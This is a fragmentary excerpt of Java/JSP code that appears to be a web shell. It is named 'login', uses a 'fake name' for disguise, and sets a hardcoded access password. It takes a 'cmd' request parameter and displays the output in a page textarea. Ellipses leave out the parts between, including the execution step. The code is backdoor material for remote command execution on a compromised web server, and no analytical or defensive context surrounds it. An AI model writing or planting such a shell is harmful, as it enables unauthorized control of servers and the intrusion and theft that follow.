...
//################ VARIABLES GOES HERE #######################=============================================]
String shell_name = "login";
String shell_fake_name = "login";
String shell_title = " :: " + shell_name + " ::";
String shell_version = "v1";
String shell_password = "admindejibahenxiao";
...
if((request.getParameter("cmd")!=null) && (!request.getParameter("cmd").equals(""))){
	...
	"<textarea name=\"filesource\" style=\"width:100%;height:200px;\">" + result_ + "
